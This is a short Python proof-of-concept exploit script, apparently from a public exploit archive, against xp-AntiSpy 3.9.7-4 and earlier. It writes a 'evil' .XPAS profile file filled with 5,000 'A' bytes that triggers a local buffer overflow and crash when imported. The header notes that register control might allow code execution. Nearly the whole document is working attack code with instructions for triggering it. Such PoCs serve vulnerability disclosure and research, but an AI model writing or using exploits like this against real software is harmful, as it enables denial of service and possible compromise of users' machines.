#!/usr/bin/env python

######################################################################

#

# xp-AntiSpy <= 3.9.7-4 Local (.XPAS File) Local Buffer Overflow PoC

# Found By: Dr_IDE

# Tested On: XPSP3

# Notes:

# 1) The program does not check the imported data in any way.

# 2) If you import this profile and select it, the program will crash.

# 3) We get a hold of a register so execution may be possible?

#

######################################################################


buff = ("\x41" * 5000);


sploit = (buff)


try:

print ("\n\n#############################################################");

print ("# xp-AntiSpy <= 3.9.7-4 Local (.XPAS File) Local DoS Exploit");

print ("# By: Dr_IDE");

print ("# pocoftheday.blogspot.com");

print ("#############################################################\n");

print ("[*] Writing evil .XPAS profile file.");

f1 = open("Dr_IDEs_Evil_Profile.xpas","w");

f1.write(sploit);

f1.close();

print ('[*] Success. Import File and Click "File -> Evil Profile".');


except:

print ("[-] Error, could not write the file.");


#[pocoftheday.blogspot.com] 
